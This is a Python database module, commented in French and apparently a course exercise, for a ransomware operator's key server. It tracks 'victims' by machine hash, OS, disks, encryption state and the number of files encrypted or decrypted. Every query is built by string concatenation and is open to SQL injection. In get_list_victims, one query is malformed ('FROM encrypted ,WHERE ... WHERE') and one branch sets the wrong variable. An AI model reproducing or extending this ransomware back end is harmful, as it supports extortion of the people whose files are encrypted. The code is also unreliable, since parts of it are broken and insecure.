import sqlite3

# Constantes
DB_FILENAME = '../serveur_cles/data/victims.sqlite'


def connect_db():
    """
    Initialise la connexion vers la base de donnée
    :return: La connexion établie avec la base de donnée
    """
    connexion = sqlite3.connect(DB_FILENAME)
    if connexion:
        print('Connexion avec la DB effectué')
    return connexion


def insert_data(conn, table, items, data):
    """
    Insère des données de type 'items' avec les valeurs 'data' dans la 'table' en utilisant la connexion 'conn' existante
    :param conn: la connexion existante vers la base de donnée
    :param table: la table dans laquelle insérer les données
    :param items: le nom des champs à insérer
    :param data: la valeur des champs à insérer
    :return: Néant
    """
    insert = "INSERT INTO " + table + " " + items + " VALUES " + data
    cursor = conn.cursor()
    cursor.execute(insert)
    conn.commit()
    cursor.close()


def select_data(conn, select_query):
    """
    Exécute un SELECT dans la base de donnée (conn) et retourne les records correspondants
    :param conn: la connexion déjà établie à la base de donnée
    :param select_query: la requête du select à effectuer
    :return: les records correspondants au résultats du SELECT
    """
    cursor = conn.cursor()
    cursor.execute(select_query)
    records = cursor.fetchall()
    cursor.close()
    return records


def get_list_victims(conn):
    """
    Retourne la liste des victimes présente dans la base de donnée
    (N'oubliez pas de vous servir de la fonction précédente pour effectuer la requête)
    :param conn: la connexion déjà établie à la base de donnée
    :return: La liste des victimes
    """
    commande = '''
    SELECT victims.id_victim, victims.hash, victims.os, victims.disks, last_states.last_state  
    FROM (SELECT id_victim, MAX(datetime), state AS last_state
    FROM states
    GROUP BY id_victim) AS last_states
    INNER JOIN victims ON victims.id_victim = last_states.id_victim
    '''
    victims = select_data(conn, commande)
    x = 0
    victims_list = []
    for victim in victims:
        victims_list.append(list(victim))
        if victim[4] == 'CRYPT' or victim[4] == 'PENDING':
            commande = f' SELECT encrypted.nb_files FROM encrypted ,WHERE encrypted.id_victim = {victim[0]} WHERE id_victim = {victim[0]} AND encrypted.datetime = (SELECT MAX(datetime) FROM encrypted WHERE id_victim = {victim[0]})'
            fichiers = select_data(conn, commande)
            if fichiers:
                fichiers = fichiers[0][0]
            else:
                fichiers = 0
            victims_list[x].append(fichiers)
        if victim[4] == 'DECRYPT':
            commande = f'SELECT decrypted.nb_files FROM decrypted WHERE decrypted.id_victim = {victim[0]} AND decrypted.datetime = (SELECT MAX(datetime) FROM decrypted WHERE id_victim = {victim[0]})'
            fichiers = select_data(conn, commande)
            if fichiers:
                fichiers = fichiers[0][0]
            else:
                nb_files = 0
            victims_list[x].append(fichiers)
        else:
            victims_list[x].append(0)
        x += 1
    return victims_list


def get_list_history(conn, id_victim):
    """
    Retourne l'historique correspondant à la victime 'id_victim'
    :param conn: la connexion déjà établie à la base de donnée
    :param id_victim: l'identifiant de la victime
    :return: la liste de son historique
    """
    query = f'''
            SELECT states.id_victim, states.datetime, states.state
            FROM states
            WHERE states.id_victim = {id_victim}
            '''
    histories = select_data(conn, query)

    # histories_list contient la liste de tous les historiques d'état (id_victim, datetime, state, nb_files)
    i = 0
    histories_list = []
    for history in histories:
        histories_list.append(list(history))
        if history[2] == 'CRYPT' or history[2] == 'PENDING':
            query = f'''
                    SELECT encrypted.nb_files
                    FROM encrypted
                    WHERE encrypted.id_victim = {history[0]}
                      AND encrypted.datetime = {history[1]}
                    '''
            nb_files = select_data(conn, query)
            if nb_files:
                nb_files = nb_files[0][0]  # [(nb_files,)] --> nb_files
            else:
                nb_files = 0
            histories_list[i].append(nb_files)  # ajout du dernier nb_files encrypted
        else:
            histories_list[i].append(0)  # ajout du 0 pour le cas INITIALIZE
        i += 1

    return histories_list
